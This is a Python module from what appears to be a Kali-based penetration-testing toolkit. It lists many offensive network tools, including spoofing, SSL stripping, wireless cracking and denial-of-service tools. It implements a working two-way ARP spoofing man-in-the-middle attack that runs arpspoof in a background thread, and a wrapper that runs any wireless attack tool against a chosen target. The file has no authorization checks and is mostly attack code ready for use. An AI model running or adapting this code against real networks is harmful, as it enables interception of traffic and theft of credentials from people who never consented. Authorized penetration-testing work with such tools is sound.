"""Network attack tools integration"""

import subprocess
import time
import threading
from typing import Dict, Any, Optional
from src.utils.kali_tools import KaliToolsManager
from rich.live import Live
from rich.panel import Panel
from rich.text import Text
from rich.console import Console
from src.utils.tool_decorators import tool_loading_animation

class NetworkAttacks:
    """Network attack tools"""
    
    def __init__(self):
        """Initialize network attack tools"""
        self.kali_tools = KaliToolsManager()
        self._check_required_tools()
        self._arp_spoof_thread = None
        self._stop_arp_spoof = threading.Event()
        
    def _check_required_tools(self):
        """Check required tools"""
        required_tools = [
            # ARP and Network Attacks
            'arpspoof', 'ettercap', 'bettercap', 'macchanger', 
            
            # Wireless attack tools
            'bully', 'fern-wifi-cracker', 
            'aircrack-ng', 'kismet', 'pixiewps', 'reaver', 'wifite',
            
            # Network Scanning and Discovery
            'netdiscover', 'nmap', 'masscan', 'unicornscan', 'fping', 
            'zmap', 'scapy', 'hping3', 'netcat', 'ncat',
            
            # Packet Manipulation and Injection
            'aireplay-ng', 'mdk3', 'tcpreplay', 'tcpdump', 'wireshark',
            
            # DNS and Spoofing Tools
            'dnsspoof', 'dnsrecon', 'dnswalk', 'dnschef', 
            
            # Network Sniffing and Interception
            'dsniff', 'sslstrip', 'ettercap-graphical', 
            
            # Routing and Redirection
            'arpwatch', 'iptables', 'ipchains', 
            
            # Network Stress and DoS Tools
            'slowhttptest', 'goldeneye', 'slowloris', 'xerxes', 
            
            # Tunneling and Proxy Tools
            'proxychains', 'socat', 'stunnel', 'proxytunnel',
            
            # Network Vulnerability Scanning
            'nikto', 'w3af', 'openvas', 'nessus', 
            
            # Additional Utilities
            'netstat', 'ss', 'ip', 'route', 'traceroute'
        ]
        missing_tools = []
        
        for tool in required_tools:
            if not self.kali_tools.check_tool(tool):
                missing_tools.append(tool)
                
        if missing_tools:
            print(f"[yellow]Missing required tools for network attacks: {', '.join(missing_tools)}[/yellow]")
            print("[yellow]Some functionality may be limited.[/yellow]")
            print("[yellow]Run the tool installer from the main menu to install missing tools.[/yellow]")
    
    @tool_loading_animation
    def run_arp_spoof(self, target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> Dict[str, Any]:
        """
        Perform ARP spoofing attack
        
        :param target_ip: IP address of the target to spoof
        :param gateway_ip: IP address of the gateway
        :param interface: Network interface to use (optional)
        :return: Dictionary with attack status
        """
        if not self.kali_tools.check_tool('arpspoof'):
            return {'error': 'arpspoof is not installed. Please install it first.'}
        
        # Validate IP addresses
        def is_valid_ip(ip: str) -> bool:
            try:
                parts = ip.split('.')
                return (len(parts) == 4 and 
                        all(0 <= int(part) <= 255 for part in parts))
            except (ValueError, TypeError):
                return False
        
        if not is_valid_ip(target_ip) or not is_valid_ip(gateway_ip):
            return {'error': 'Invalid IP address format'}
        
        # Determine interface if not provided
        if not interface:
            try:
                # Use default route interface
                route_output = subprocess.check_output(['ip', 'route'], text=True)
                interface = route_output.split()[4]
            except Exception:
                return {'error': 'Could not determine network interface'}
        
        def arp_spoof_thread():
            """Background thread for ARP spoofing"""
            try:
                # ARP spoof commands
                cmd1 = ['arpspoof', '-i', interface, '-t', target_ip, gateway_ip]
                cmd2 = ['arpspoof', '-i', interface, '-t', gateway_ip, target_ip]
                
                # Run ARP spoofing
                process1 = subprocess.Popen(cmd1, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                process2 = subprocess.Popen(cmd2, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Wait until stop is requested
                while not self._stop_arp_spoof.is_set():
                    time.sleep(1)
                
                # Terminate processes
                process1.terminate()
                process2.terminate()
                
            except Exception as e:
                print(f"[red]ARP Spoofing Error: {str(e)}[/red]")
        
        # Start ARP spoofing in a separate thread
        self._stop_arp_spoof.clear()
        self._arp_spoof_thread = threading.Thread(target=arp_spoof_thread)
        self._arp_spoof_thread.start()
        
        return {
            'status': 'ARP Spoofing started',
            'target': target_ip,
            'gateway': gateway_ip,
            'interface': interface
        }
    
    def stop_arp_spoof(self) -> Dict[str, Any]:
        """
        Stop ongoing ARP spoofing attack
        
        :return: Dictionary with stop status
        """
        if not self._arp_spoof_thread or not self._arp_spoof_thread.is_alive():
            return {'error': 'No active ARP spoofing attack'}
        
        # Signal thread to stop
        self._stop_arp_spoof.set()
        self._arp_spoof_thread.join(timeout=5)
        
        # Reset thread
        self._arp_spoof_thread = None
        
        return {'status': 'ARP Spoofing stopped'}

    @tool_loading_animation
    def run_wireless_attack(self, tool: str, target: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Run wireless attack tools
        
        :param tool: Name of the wireless attack tool to use
        :param target: Target network or device
        :param params: Additional parameters for the tool
        :return: Dictionary with attack results
        """
        if not self.kali_tools.check_tool(tool):
            return {'error': f'{tool} is not installed. Please install it first.'}
        
        try:
            # Prepare command with optional parameters
            cmd = [tool, target]
            if params:
                for k, v in params.items():
                    cmd.extend([f'--{k}', str(v)])
            
            # Run the wireless attack tool
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'status': 'Wireless attack completed',
                'tool': tool,
                'target': target,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
        
        except subprocess.TimeoutExpired:
            return {'error': f'Wireless attack with {tool} timed out'}
        except Exception as e:
            return {'error': f'Wireless attack failed: {str(e)}'}
